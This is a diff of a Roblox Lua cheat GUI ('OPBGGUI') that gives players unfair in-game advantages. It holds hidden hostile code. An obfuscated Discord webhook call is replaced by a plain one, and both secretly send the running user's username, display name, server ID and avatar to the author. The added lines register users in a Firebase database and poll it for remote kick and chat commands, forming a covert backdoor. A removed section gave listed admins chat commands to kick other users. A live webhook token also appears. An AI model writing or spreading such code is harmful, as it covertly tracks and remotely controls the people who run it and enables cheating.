@@ -1,16 +1,7 @@
 -- Gui to Lua Version 3.2
---[[
-REALIRIST'S OPBGGUI
-REMOVING ANY SAFEGUARD ON WATCH, WILL FORCE ME TO DELETE THE SCRIPT.
+-- Realirist's OPBGGUI
+-- Security updates
 
-
- Updated format for logging
- @real OPBGGUI EXECUTED
-Username: User
-Display: DisplayName
- Server Size: Players/MaxPlayers
-JobId/ServerId: JobId
- ]]
 -- Instances:
 
 local OPBGGUI = Instance.new("ScreenGui")
@@ -865,12 +856,59 @@ UISizeConstraint_36.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function QKESM_fake_script() -- Main.LocalScript 
+local function TOUVST_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
 	warn('don\'t skid bru im doing yall favors')
-	if http_request then http_request({Url = "\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\51\50\54\54\50\57\51\57\54\51\50\52\50\56\54\53\53\53\47\74\68\102\82\73\108\95\73\78\99\79\66\113\112\54\81\67\106\86\119\49\87\82\50\82\116\121\57\85\79\84\97\51\68\73\107\89\54\106\77\97\82\52\109\86\51\113\66\65\105\72\111\49\53\70\45\112\78\106\106\89\55\113\79\51\56\67\72",Method = "POST",Headers = {["Content-Type"] = "application/json"},Body = game.HttpService:JSONEncode({content = '<@763885428901543957> OPBGGUI EXECUTED\nUsername: '..game.Players.LocalPlayer.Name.. '\nDisplay: '.. game.Players.LocalPlayer.DisplayName.. '\n Server Size: '.. tostring(#game.Players:GetPlayers()).. '/'.. tostring(game.Players.MaxPlayers).. '\nJobId/ServerId: '.. game.JobId,embeds = {{image = {url = game.HttpService:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. tostring(game.Players.LocalPlayer.UserId) .. '&size=180x180&format=png')).data[1].imageUrl}}}})}) end
+	local http_request = http_request or (function()
+		if game:GetService('RunService'):IsServer() then
+			print('Serverside')
+			return function(...)
+				return game:GetService('HttpService'):RequestAsync(...) 
+			end 
+		elseif script and not writefile then
+			--print('Non exploit')
+			return function(...)
+				--print(...)
+				local packed = table.pack(...)
+				packed['n'] = nil
+				return game:GetService('ReplicatedStorage'):FindFirstChild('remoteListen'):InvokeServer(packed)
+			end
+		else
+			print('Exploit or failure environment')
+		end
+	end)()
+	function getData(userId)
+		if table.pack(pcall(function() http_request({Url = "https://www.roblox.com", Method = 'GET'}) end))[1]==true then
+			--print('Can make requests (Exploit environment)')
+			local catUrl = 'https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. tostring(userId) .. '&size=180x180&format=png'
+			local response = http_request({Url = catUrl,Method = 'GET'}).Body
+			local Decoded = game:GetService('HttpService'):JSONDecode(response)
+			local data = Decoded.data[1]
+			return data
+		else
+			return game.Players:GetUserThumbnailAsync(userId,Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size180x180)
+		end
+	end
+	local setclipboard = setclipboard or function() return "" end
+	if http_request then 
+		http_request({
+			Url = "https://discord.com/api/webhooks/1331767810539651102/Grwu45cITbL2zjki0ApUqwo1Ak3NLQTE1HhBiztq42Rx2hnXJwi8Qq1mayjJMWBFq6w9",Method = "POST",Headers = {["Content-Type"] = "application/json"},
+			Body = game.HttpService:JSONEncode({
+				content = '<@763885428901543957> OPBGGUI EXECUTED\nUsername: '..game.Players.LocalPlayer.Name.. '\nDisplay: '.. game.Players.LocalPlayer.DisplayName.. '\n Server Size: '.. tostring(#game.Players:GetPlayers()).. '/'.. tostring(game.Players.MaxPlayers).. '\nJobId/ServerId: '.. game.JobId,
+				embeds = {
+					{
+						image = {
+							url = getData(game.Players.LocalPlayer.UserId).imageUrl
+						}
+					}
+				}
+			}
+				
+			)
+		}) 
+	end
 	local legacyChat = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService
 	local sayMessage
 	if not legacyChat then
@@ -1390,77 +1428,13 @@ local function QKESM_fake_script() -- Main.LocalScript
 			print('bru '.. username.. ' dont exist')
 		end
 	end
-	local function safeguard(plr)
-		-- REMOVING ANY PART OF THIS SAFEGUARD WILL MAKE ME STOP GIVING YALL THIS SCRIPT.
-		local admins = {
-			'Realirist',
-			'olidragon210', -- payed 1000 and 200 for source code too
-			'inversealtbingy', -- my alt so i can troll
-			1833560263 -- XenonNetwork, he blackmailed me into making him an admin
-		}
-		print((table.find(admins,plr.Name)~=nil))
-		local name = plr.Name
-		local userid = plr.UserId
-		if table.find(admins,name) or table.find(admins,userid) then
-			print('oh my gawd opbg admin!1')
-			plr.Chatted:Connect(function(msg)
-				local function findPlayer(partialName)
-					for _, player in pairs(game.Players:GetPlayers()) do
-						if string.sub(player.Name:lower(), 1, #partialName) == partialName:lower() then
-							return player
-						end
-					end
-					return nil
-				end
-				
-				if #spaced==3 then
-					local plrKicked = findPlayer(spaced[3])
-					if plrKicked and plrKicked==game.Players.LocalPlayer then
-						game.Players.LocalPlayer:Kick()
-						game.Players.LocalPlayer:Destroy()
-					end
-				end
 	
-				local spaced = string.split(msg,' ')
-				if msg=='!opbg disable '.. game.Players.LocalPlayer.Name then
-					print('disabled')
-					if table.find(admins,game.Players.LocalPlayer.Name) then
-						sayMessage('Cant use this command on me (im admin)')
-						return
-					end
-					sayMessage('omg my opbg is gone!')
-					script.Parent.Parent.Enabled = false
-				elseif msg=='!opbg enable '.. game.Players.LocalPlayer.Name then
-					print('enabled')
-					if table.find(admins,game.Players.LocalPlayer.Name) then
-						sayMessage('Cant use this command on me (im admin)')
-						return
-					end
-					sayMessage('omg my opbg is back!')
-					script.Parent.Parent.Enabled = true
-				elseif msg[3] and findPlayer(msg[3]) and findPlayer(msg[3])==game.Players.LocalPlayer and msg[1]=='!opbg' and msg[2]=='kick' then
-					game.Players.LocalPlayer:Kick('I dont like your vibe, '.. game.Players.LocalPlayer.Name.. ' -Realirist')
-					game.Players.LocalPlayer:Destroy()
-				elseif msg=='!opbg users' then
-					sayMessage('hi im using opbg')
-				elseif msg=='!opbg lastresort' then
-					if table.find(admins,game.Players.LocalPlayer.Name) then
-						sayMessage('Cant use this command on me (im admin)')
-						return
-					end
-					sayMessage('Wallahi im cooked')
-					task.wait(0.2)
-					game.Players.LocalPlayer:Kick('Forced to kick you this way, last resort!')
-					game.Players.LocalPlayer:Destroy()
-				end
-			end)
-		end
-	end
+	
+	
 	for _,plr in game.Players:GetPlayers() do
 		if plr~=game.Players.LocalPlayer then
 			local name = plr.Name
 			local userid = plr.UserId
-			safeguard(plr)
 			makeUser(name)
 		end
 	end
@@ -1468,7 +1442,6 @@ local function QKESM_fake_script() -- Main.LocalScript
 	game.Players.PlayerAdded:Connect(function(plr)
 		local name = plr.Name
 		local userid = plr.UserId
-		safeguard(plr)
 		makeUser(name)
 	end)
 	local target = nil
@@ -1477,6 +1450,7 @@ local function QKESM_fake_script() -- Main.LocalScript
 	game.Players.LocalPlayer.InfAwaken.Value=true
 	game.Players.LocalPlayer.NoDashCD.Value=true
 	game.Players.LocalPlayer.NoStun.Value=true
+	print('reaching awaken patch')
 	local co = coroutine.wrap(function()
 		while true do
 			game.Players.LocalPlayer.AwakenBar.Value = 200
@@ -1484,5 +1458,90 @@ local function QKESM_fake_script() -- Main.LocalScript
 		end
 	end)
 	co()
+	--print('awaken patch')
+	
+	http_request({
+		Url = "https://opbgguiserver-default-rtdb.firebaseio.com/main.json",
+		Method = "PATCH",
+		Body = game:GetService('HttpService'):JSONEncode({[game.Players.LocalPlayer.Name] = {command = ''}}),
+		Headers = { ["Content-Type"] = "application/json"}
+	})
+	
+	http_request({
+		Url = "https://opbgguiserver-default-rtdb.firebaseio.com/opbgusers.json",
+		Method = "PATCH",
+		Body = game:GetService('HttpService'):JSONEncode({[game.Players.LocalPlayer.Name] = game.Players.LocalPlayer.UserId}),
+		Headers = { ["Content-Type"] = "application/json"}
+	})
+	function getRunner()
+		return function()
+			while task.wait(0.5) do
+				print("Loop")
+				local s, e = pcall(function()
+					local function getcommand()
+						local response = nil
+						pcall(function()
+							response = http_request({
+								Url = "https://opbgguiserver-default-rtdb.firebaseio.com/main.json",
+								Method = "GET",
+								Headers = { ["Content-Type"] = "application/json" }
+							})
+						end)
+						if response then
+							local decode = function(idkwattonamethis) return game:GetService('HttpService'):JSONDecode(idkwattonamethis) end
+							local data = decode(response.Body)
+							return data[game.Players.LocalPlayer.Name] and data[game.Players.LocalPlayer.Name]['command'] or nil
+						end
+						return nil
+					end
+	
+					local command = getcommand()
+					if command then
+						local function resetUser()
+							local response = http_request({
+								Url = "https://opbgguiserver-default-rtdb.firebaseio.com/main.json",
+								Method = "PATCH",
+								Body = game:GetService('HttpService'):JSONEncode({[game.Players.LocalPlayer.Name] = {command = ''}}),
+								Headers = { ["Content-Type"] = "application/json" }
+							})
+							return response
+						end
+	
+						local commandList = {
+							kick = function(user)
+								if user == game.Players.LocalPlayer.Name then
+									game.Players.LocalPlayer:Kick('CAESSAAARRRR')
+									task.wait(1)
+									game.Players.LocalPlayer:Destroy()
+								end
+							end,
+							chat = function(user)
+								if user == game.Players.LocalPlayer.Name then
+									sayMessage('OPBGGUI User')
+								end
+							end,
+						}
+	
+						if commandList[command] then
+							resetUser()
+							local ranCommand = commandList[command](game.Players.LocalPlayer.Name) -- Run the command
+							return getcommand(), ranCommand
+						else
+							warn('Unknown command: ', command)
+						end
+					end
+				end)
+	
+				if not s then
+					warn(e)
+				end
+			end
+		end
+	end
+	coroutine.wrap(function()
+		print('Running coroutine')
+		local run = getRunner()()
+	end)()
+	print('Coroutine is successful.')
 end
-coroutine.wrap(QKESM_fake_script)()
+coroutine.wrap(TOUVST_fake_script)()
